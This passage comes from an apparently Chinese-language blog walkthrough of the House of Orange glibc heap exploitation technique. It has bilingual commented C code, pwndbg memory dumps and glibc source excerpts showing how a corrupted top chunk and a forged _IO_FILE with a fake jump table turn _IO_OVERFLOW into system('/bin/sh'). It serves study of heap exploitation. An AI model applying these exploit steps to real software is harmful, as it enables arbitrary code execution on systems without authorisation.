so</span></span><br><span class="line"><span class="comment">  that calling _IO_OVERFLOW(fp, EOF) translates to system(&#x27;/bin/sh&#x27;).</span></span><br><span class="line"><span class="comment">  我们的想法是用一个 fake 文件指针覆盖 _IO_list_all 的指针，它的 _IO_OVERFLOW 指向 system，前 8 个字节设置为 `/bin/sh` ，因此调用 `_IO_OVERFLOW(fp, EOF)` 的操作会被翻译成 `system(&#x27;/bin/sh&#x27;)`</span></span><br><span class="line"><span class="comment">  More about file-pointer exploitation can be found here:</span></span><br><span class="line"><span class="comment">  https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  The address of the _IO_list_all can be calculated from the fd and bk of the free chunk, as they</span></span><br><span class="line"><span class="comment">  currently point to the libc&#x27;s main_arena.</span></span><br><span class="line"><span class="comment">  _IO_list_all 的地址可以通过被释放的chunk的 fd 和 bk 计算，它们现在指向的是 libc 的 main_area</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">io_list_all = top[<span class="number">2</span>] + <span class="number">0x9a8</span>;</span><br></pre></td></tr></table></figure>
<p>这样我们能推出 io_list_all 的地址：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p&#x2F;x io_list_all </span><br><span class="line">$3 &#x3D; 0x7ffff7dd2520</span><br><span class="line">pwndbg&gt; x&#x2F;20xg 0x7ffff7dd2520</span><br><span class="line">0x7ffff7dd2520 &lt;_IO_list_all&gt;:	0x00007ffff7dd2540	0x0000000000000000</span><br><span class="line">0x7ffff7dd2530:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dd2540 &lt;_IO_2_1_stderr_&gt;:	0x00000000fbad2887	0x00007ffff7dd25c3</span><br><span class="line">0x7ffff7dd2550 &lt;_IO_2_1_stderr_+16&gt;:	0x00007ffff7dd25c3	0x00007ffff7dd25c3</span><br><span class="line">0x7ffff7dd2560 &lt;_IO_2_1_stderr_+32&gt;:	0x00007ffff7dd25c3	0x00007ffff7dd25c3</span><br><span class="line">0x7ffff7dd2570 &lt;_IO_2_1_stderr_+48&gt;:	0x00007ffff7dd25c3	0x00007ffff7dd25c3</span><br><span class="line">0x7ffff7dd2580 &lt;_IO_2_1_stderr_+64&gt;:	0x00007ffff7dd25c4	0x0000000000000000</span><br><span class="line">0x7ffff7dd2590 &lt;_IO_2_1_stderr_+80&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dd25a0 &lt;_IO_2_1_stderr_+96&gt;:	0x0000000000000000	0x00007ffff7dd2620</span><br><span class="line">0x7ffff7dd25b0 &lt;_IO_2_1_stderr_+112&gt;:	0x0000000000000002	0xffffffffffffffff</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  We plan to overwrite the fd and bk pointers of the old top,</span></span><br><span class="line"><span class="comment">  which has now been added to the unsorted bins.</span></span><br><span class="line"><span class="comment">  我们计划覆盖在旧的 top chunk 上的现在被加入 unsorted bins 的 fd 和 bk。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  When malloc tries to satisfy a request by splitting this free chunk</span></span><br><span class="line"><span class="comment">  the value at chunk-&gt;bk-&gt;fd gets overwritten with the address of the unsorted-bin-list</span></span><br><span class="line"><span class="comment">  in libc&#x27;s main_arena.</span></span><br><span class="line"><span class="comment">  当 malloc 试图通过拆分这个 free chunk 满足请求时，chunk-&gt;bk-&gt;fd 的值会被 libc 中的 main_arena 中的 unsorted-bin-list 的地址所覆盖。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Note that this overwrite occurs before the sanity check and therefore, will occur in any</span></span><br><span class="line"><span class="comment">  case.</span></span><br><span class="line"><span class="comment">  注意，这个覆盖发生在完整性检查之前，因此任何情况下都会发生。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Here, we require that chunk-&gt;bk-&gt;fd to be the value of _IO_list_all.</span></span><br><span class="line"><span class="comment">  在这里，我们请求 chunk-&gt;bk-&gt;fd 的值为 _IO_list_all。</span></span><br><span class="line"><span class="comment">  So, we should set chunk-&gt;bk to be _IO_list_all - 16</span></span><br><span class="line"><span class="comment">  因此，我们需要设置 chunk-&gt;bk 为 _IO_list_all - 16</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line">top[<span class="number">3</span>] = io_list_all - <span class="number">0x10</span>;</span><br></pre></td></tr></table></figure>
<p>修改前：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;20gx top - 2</span><br><span class="line">0x602400:	0x0000000000000000	0x0000000000000be1</span><br><span class="line">0x602410:	0x00007ffff7dd1b78	0x00007ffff7dd1b78    &lt;-- fd, bk</span><br><span class="line">0x602420:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602430:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602440:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>修改后：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;10gx top</span><br><span class="line">0x602400:	0x0000000000000000	0x0000000000000be1</span><br><span class="line">0x602410:	0x00007ffff7dd1b78	0x00007ffff7dd2510    &lt;-- fd, bk</span><br><span class="line">0x602420:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602430:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602440:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>此时的堆：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x602400 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 3041, </span><br><span class="line">  fd &#x3D; 0x7ffff7dd1b78 &lt;main_arena+88&gt;, </span><br><span class="line">  bk &#x3D; 0x7ffff7dd2510, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里，会顺便涉及到 glibc 的异常处理.<br>一般在出现内存错误时，会调用函数 malloc_printerr() 打印出错信息</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">malloc_printerr (<span class="keyword">int</span> action, <span class="keyword">const</span> <span class="keyword">char</span> *str, <span class="keyword">void</span> *ptr, mstate ar_ptr)</span><br><span class="line">&#123;</span><br><span class="line">  [...]</span><br><span class="line">  <span class="keyword">if</span> ((action &amp; <span class="number">5</span>) == <span class="number">5</span>)</span><br><span class="line">    __libc_message (action &amp; <span class="number">2</span>, <span class="string">&quot;%s\n&quot;</span>, str);</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (action &amp; <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">char</span> buf[<span class="number">2</span> * <span class="keyword">sizeof</span> (<span class="keyword">uintptr_t</span>) + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">      buf[<span class="keyword">sizeof</span> (buf) - <span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">      <span class="keyword">char</span> *cp = _itoa_word ((<span class="keyword">uintptr_t</span>) ptr, &amp;buf[<span class="keyword">sizeof</span> (buf) - <span class="number">1</span>], <span class="number">16</span>, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">while</span> (cp &gt; buf)</span><br><span class="line">        *--cp = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">      __libc_message (action &amp; <span class="number">2</span>, <span class="string">&quot;*** Error in `%s&#x27;: %s: 0x%s ***\n&quot;</span>,</span><br><span class="line">                      __libc_argv[<span class="number">0</span>] ? : <span class="string">&quot;&lt;unknown&gt;&quot;</span>, str, cp);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (action &amp; <span class="number">2</span>)</span><br><span class="line">    <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当调用 <code>__libc_message</code> 时：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// sysdeps/posix/libc_fatal.c</span></span><br><span class="line"><span class="comment">/* Abort with an error message.  */</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">__libc_message (<span class="keyword">int</span> do_abort, <span class="keyword">const</span> <span class="keyword">char</span> *fmt, ...)</span><br><span class="line">&#123;</span><br><span class="line">  [...]</span><br><span class="line">  <span class="keyword">if</span> (do_abort)</span><br><span class="line">    &#123;</span><br><span class="line">      BEFORE_ABORT (do_abort, written, fd);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Kill the application.  */</span></span><br><span class="line">      <span class="built_in">abort</span> ();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>do_abort</code> 调用 <code>fflush</code>，即 <code>_IO_flush_all_lockp</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// stdlib/abort.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fflush(s) _IO_flush_all_lockp (0)</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (stage == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ++stage;</span><br><span class="line">      fflush (<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// libio/genops.c</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="keyword">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="keyword">int</span> last_stamp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  __libc_cleanup_region_start (do_lock, flush_cleanup, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  last_stamp = _IO_list_all_stamp;</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;   <span class="comment">// 将其覆盖</span></span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">       )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)     <span class="comment">// 将其修改为 system 函数</span></span><br><span class="line">    result = EOF;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (last_stamp != _IO_list_all_stamp)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Something was added to the list.  Start all over again.  */</span></span><br><span class="line">      fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">      last_stamp = _IO_list_all_stamp;</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    fp = fp-&gt;_chain;    <span class="comment">// 指向我们指定的区域</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_lock_unlock (list_all_lock);</span><br><span class="line">  __libc_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>_IO_list_all 是一个 _IO_FILE_plus 类型的对象，我们的目的就是将 _IO_list_all 指针改写为一个伪造的指针，它的 _IO_OVERFLOW 指向 system，并且前 8 字节被设置为 ‘/bin/sh’，所以对 _IO_OVERFLOW(fp, EOF) 的调用最终会变成对 system(‘/bin/sh’) 的调用。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  At the end, the system function will be invoked with the pointer to this file pointer.</span></span><br><span class="line"><span class="comment">  最后，我们用指向这个文件指针的指针调用 system 函数</span></span><br><span class="line"><span class="comment">  If we fill the first 8 bytes with /bin/sh, it is equivalent to system(/bin/sh)</span></span><br><span class="line"><span class="comment">  如果我们将前 8 个字节填充为 /bin.sh，它等价于调用 system(/bin/sh)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>( ( <span class="keyword">char</span> *) top, <span class="string">&quot;/bin/sh\x00&quot;</span>, <span class="number">8</span>);</span><br></pre></td></tr></table></figure>
<p>于是 old top chunk 被修改为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;10gx top</span><br><span class="line">0x602400:	0x0068732f6e69622f	0x0000000000000be1</span><br><span class="line">0x602410:	0x00007ffff7dd1b78	0x00007ffff7dd2510</span><br><span class="line">0x602420:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602430:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602440:	0x0000000000000000	0x0000000000000000</span><br><span class="line">pwndbg&gt; x&#x2F;2s top </span><br><span class="line">0x602400:	&quot;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line">0x602408:	&quot;\341\v&quot;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  The function _IO_flush_all_lockp iterates through the file pointer linked-list</span></span><br><span class="line"><span class="comment">  in _IO_list_all.</span></span><br><span class="line"><span class="comment">  _IO_flush_all_lockp 函数会遍历 _IO_list_all 中的文件指针 linked-list</span></span><br><span class="line"><span class="comment">  Since we can only overwrite this address with main_arena&#x27;s unsorted-bin-list,</span></span><br><span class="line"><span class="comment">  the idea is to get control over the memory at the corresponding fd-ptr.</span></span><br><span class="line"><span class="comment">  由于我们只能使用 main_arena 中的 unsorted-bin-list 覆盖这个地址，因此我们的想法时控制相应的 fd-ptr 的内存。</span></span><br><span class="line"><span class="comment">  The address of the next file pointer is located at base_address+0x68.</span></span><br><span class="line"><span class="comment">  下一个文件指针的位置在 base_address + 0x68 处。</span></span><br><span class="line"><span class="comment">  This corresponds to smallbin-4, which holds all the smallbins of</span></span><br><span class="line"><span class="comment">  sizes between 90 and 98. For further information about the libc&#x27;s bin organisation</span></span><br><span class="line"><span class="comment">  see: https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/</span></span><br><span class="line"><span class="comment">  这一块对应于 smallbin - 4，它包含所有大小在 90 到 98 之间的 smallbins。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Since we overflow the old top chunk, we also control it&#x27;s size field.</span></span><br><span class="line"><span class="comment">  如果我们溢出了旧的 top chunk，我们页控制了它的 size 位。</span></span><br><span class="line"><span class="comment">  Here it gets a little bit tricky, currently the old top chunk is in the</span></span><br><span class="line"><span class="comment">  这里给出一种稍微有趣的方法，现在 old top chunk 还在 unsortedbin list 中。</span></span><br><span class="line"><span class="comment">  unsortedbin list. For each allocation, malloc tries to serve the chunks</span></span><br><span class="line"><span class="comment">  in this list first, therefore, iterates over the list.</span></span><br><span class="line"><span class="comment">  对于每一个申请， malloc 都会试图首先用这个 list 中的 chunk，因此会先遍历一遍这个列表。</span></span><br><span class="line"><span class="comment">  Furthermore, it will sort all non-fitting chunks into the corresponding bins.</span></span><br><span class="line"><span class="comment">  此外，它会将所有没被分配的块分配到相应的 bins 列表中。</span></span><br><span class="line"><span class="comment">  If we set the size to 0x61 (97) (prev_inuse bit has to be set)</span></span><br><span class="line"><span class="comment">  入伏哦我们将 size 设为 0x61，并且触发了未分配的小块的分配方式，malloc 会将旧的 chunk 放在 smallbin-4 中。</span></span><br><span class="line"><span class="comment">  and trigger an non fitting smaller allocation, malloc will sort the old chunk into the</span></span><br><span class="line"><span class="comment">  smallbin-4. Since this bin is currently empty the old top chunk will be the new head,</span></span><br><span class="line"><span class="comment">  因为这个 bin list 现在是空的，旧的 top chunk 是新的首部，因此，会占据 main_arena 中的 smallbin[4] 的位置并最终表示一个伪文件指针的 fd-ptr。</span></span><br><span class="line"><span class="comment">  therefore, occupying the smallbin[4] location in the main_arena and</span></span><br><span class="line"><span class="comment">  eventually representing the fake file pointer&#x27;s fd-ptr.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  In addition to sorting, malloc will also perform certain size checks on them,</span></span><br><span class="line"><span class="comment">  so after sorting the old top chunk and following the bogus fd pointer</span></span><br><span class="line"><span class="comment">  to _IO_list_all, it will check the corresponding size field, detect</span></span><br><span class="line"><span class="comment">  that the size is smaller than MINSIZE &quot;size &lt;= 2 * SIZE_SZ&quot;</span></span><br><span class="line"><span class="comment">  and finally triggering the abort call that gets our chain rolling.</span></span><br><span class="line"><span class="comment">  除了排序之外，malloc 还会对它们执行一定的大小检查。因此在排序旧的 top chunk 并循着伪造的 fd 指针到 _IO_list_all 后，它会检查相应的大小字段，检测的大小 MINSIZE &quot;size &lt;= 2 * SIZE_SZ&quot; 最终触发中止调用，使我们构造的调用链执行。</span></span><br><span class="line"><span class="comment">  Here is the corresponding code in the libc:</span></span><br><span class="line"><span class="comment">  https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3717</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">top[<span class="number">1</span>] = <span class="number">0x61</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  Now comes the part where we satisfy the constraints on the fake file pointer</span></span><br><span class="line"><span class="comment">  required by the function _IO_flush_all_lockp and tested here:</span></span><br><span class="line"><span class="comment">  https://code.woboq.org/userspace/glibc/libio/genops.c.html#813</span></span><br><span class="line"><span class="comment">  现在我们要满足函数 _IO_flush_all_lockp 所需的 fake 文件指针约束并且在这里测试的部分：</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  We want to satisfy the first condition:</span></span><br><span class="line"><span class="comment">  我们希望首先满足这个条件：</span></span><br><span class="line"><span class="comment">  fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">_IO_FILE *fp = (_IO_FILE *) top;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  1. Set mode to 0: fp-&gt;_mode &lt;= 0</span></span><br><span class="line"><span class="comment">  1. 设置模式为 0</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">fp-&gt;_mode = <span class="number">0</span>; <span class="comment">// top+0xc0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  2. Set write_base to 2 and write_ptr to 3: fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line"><span class="comment">  2. 设置 write_base 为 2，write_ptr 为 3：</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">fp-&gt;_IO_write_base = (<span class="keyword">char</span> *) <span class="number">2</span>; <span class="comment">// top+0x20</span></span><br><span class="line">fp-&gt;_IO_write_ptr = (<span class="keyword">char</span> *) <span class="number">3</span>; <span class="comment">// top+0x28</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">  4) Finally set the jump table to controlled memory and place system there.</span></span><br><span class="line"><span class="comment">  The jump table pointer is right after the _IO_FILE struct:</span></span><br><span class="line"><span class="comment">  base_address+sizeof(_IO_FILE) = jump_table</span></span><br><span class="line"><span class="comment">  最终设置跳转地址以控制内存并放置 system。跳转地址的指针在 _IO_FILE 结构体后面：</span></span><br><span class="line"><span class="comment">  base_address + sizeof(_IO_FILE) = jump_table</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     4-a)  _IO_OVERFLOW  calls the ptr at offset 3: jump_table+0x18 == winner</span></span><br><span class="line"><span class="comment">     控制 _IO_OVERFLOW 调用指针在 offset 3 处：jump_table + 0x18 为需要的函数地址</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> *jump_table = &amp;top[<span class="number">12</span>]; <span class="comment">// controlled memory</span></span><br><span class="line">jump_table[<span class="number">3</span>] = (<span class="keyword">size_t</span>) &amp;winner;</span><br><span class="line">*(<span class="keyword">size_t</span> *) ((<span class="keyword">size_t</span>) fp + <span class="keyword">sizeof</span>(_IO_FILE)) = (<span class="keyword">size_t</span>) jump_table; <span class="comment">// top+0xd8</span></span><br></pre></td></tr></table></figure>
<p>修改后的 old top chunk 内存：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx top</span><br><span class="line">0x602400:	0x0068732f6e69622f	0x0000000000000061</span><br><span class="line">0x602410:	0x00007ffff7dd1b78	0x00007ffff7dd2510</span><br><span class="line">0x602420:	0x0000000000000002	0x0000000000000003</span><br><span class="line">0x602430:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602440:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602450:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602460:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602470:	0x0000000000000000	0x000000000040078f</span><br><span class="line">0x602480:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602490:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6024a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6024b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6024c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6024d0:	